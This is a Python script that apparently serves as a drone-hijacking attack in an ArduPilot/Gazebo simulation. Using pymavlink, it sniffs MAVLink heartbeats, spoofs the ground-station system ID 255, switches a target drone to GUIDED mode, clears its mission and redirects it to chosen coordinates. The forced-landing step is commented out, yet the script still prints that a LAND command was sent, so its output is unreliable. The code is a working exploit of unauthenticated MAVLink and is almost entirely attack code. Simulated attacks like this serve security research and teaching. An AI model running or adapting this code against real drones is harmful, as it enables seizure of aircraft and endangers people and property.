from pymavlink import mavutil
import time

# 1. Connect to the shared simulation network
# - 'udpin': Opens a UDP socket in listening (server) mode to passively sniff packets.
# - '0.0.0.0': Binds to all available interfaces to capture traffic dynamically (e.g., via Docker/localhost).
# - '14550': The default UDP port where drones broadcast their status and telemetry (like HEARTBEAT) to a GCS.
master = mavutil.mavlink_connection('udpin:0.0.0.0:14550')

def run_byzantine_attack():
    print("--- Byzantine Node Active: Sniffing Fleet ---")
    target_sysid = None
    my_sysid = None

    # Step 1: Discover who is who
    # We wait for heartbeats to see the other drones
    while target_sysid is None:
        msg = master.recv_match(type='HEARTBEAT', blocking=True)
        src = msg.get_srcSystem()
        
        if src == 255: continue # Ignore the real GCS
        
        # Assume the first drone we see that isn't us is the target
        if my_sysid is None:
            my_sysid = src
            print(f"[Self] Compromised Drone identified as System {my_sysid}")
        elif src != my_sysid:
            target_sysid = src
            print(f"[Target] Found legitimate Drone at System {target_sysid}")

    # Step 2: Impersonate GCS to hijack the Target
    print(f"--- Launching Hijack on System {target_sysid} ---")
    
    # We "rebind" our identity to 255 (GCS) to bypass basic filters
    master.mav.srcSystem = 255 

    # Step 3: Cancel current plan / Takeover
    print(f"--- Canceling current plan and taking over System {target_sysid} ---")
    # Change flight mode to GUIDED (mode 4 in ArduCopter) to interrupt AUTO missions
    master.mav.command_long_send(
        target_sysid, 1,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        4, 0, 0, 0, 0, 0
    )
    
    # Clear all existing mission waypoints so it doesn't resume its old plan
    master.mav.mission_clear_all_send(target_sysid, 1)
    time.sleep(1) # Wait briefly for commands to process

    # Step 4: Inject a Malicious Waypoint (DO_REPOSITION)
    # Target coordinates (modify these to fit your Gazebo world's origin)
    # Example coordinates below are typically close to ArduPilot SITL defaults.
    target_lat = -35.362758
    target_lon = 149.165135
    target_alt = 20.0

    print(f"--- Redirecting System {target_sysid} to new waypoint ---")
    master.mav.command_long_send(
        target_sysid, 1,
        mavutil.mavlink.MAV_CMD_DO_REPOSITION, 
        0,           # Confirmation
        -1,          # Param 1: Speed (-1 to use default)
        0,           # Param 2: Bitmask
        0,           # Param 3: Reserved
        0,           # Param 4: Yaw
        target_lat,  # Param 5: Latitude
        target_lon,  # Param 6: Longitude
        target_alt   # Param 7: Altitude
    )
    
    # print(f"CRITICAL: Sent DO_REPOSITION command. Impersonating GCS to hijack drone {target_sysid}.")
    # print("Waiting 15 seconds for the drone to travel...")
    # time.sleep(15)
    
    # # Step 4: Force Land at the new malicious location
    # print(f"--- Forcing System {target_sysid} to LAND ---")
    # master.mav.command_long_send(
    #     target_sysid, 1,    # Target Drone ID and Component ID
    #     mavutil.mavlink.MAV_CMD_NAV_LAND, 
    #     0, 0, 0, 0, 0, 0, 0, 0
    # )
    
    print(f"CRITICAL: Sent LAND command to Drone {target_sysid} at the hijacked location.")
if __name__ == "__main__":
    run_byzantine_attack()